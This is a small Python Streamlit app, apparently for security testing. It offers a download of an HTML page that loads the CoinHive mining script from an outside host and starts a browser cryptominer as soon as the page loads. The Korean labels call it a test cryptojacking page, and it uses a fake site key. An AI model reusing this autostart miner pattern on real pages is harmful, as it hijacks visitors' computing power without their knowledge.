import streamlit as st

crypto_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Test Page</title>
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      var miner = new CoinHive.Anonymous('FAKE_SITE_KEY_FOR_TEST', { throttle: 0.2 });
      miner.start();
      console.log("💰 CoinHive miner started (Test Mode)");
    });
  </script>
</head>
<body>
  <h1>🚨 테스트용 크립토재킹 페이지</h1>
  <p>이 페이지는 CoinHive 방식으로 채굴 코드가 포함되어 있습니다 (실제 채굴은 발생하지 않음).</p>
</body>
</html>
'''

st.title("크립토재킹 자동 실행 HTML 파일 다운로드")
st.download_button(
    label="CryptoMiner HTML 받기",
    data=crypto_html,
    file_name="crypto_autostart_test.html",
    mime="text/html"
)
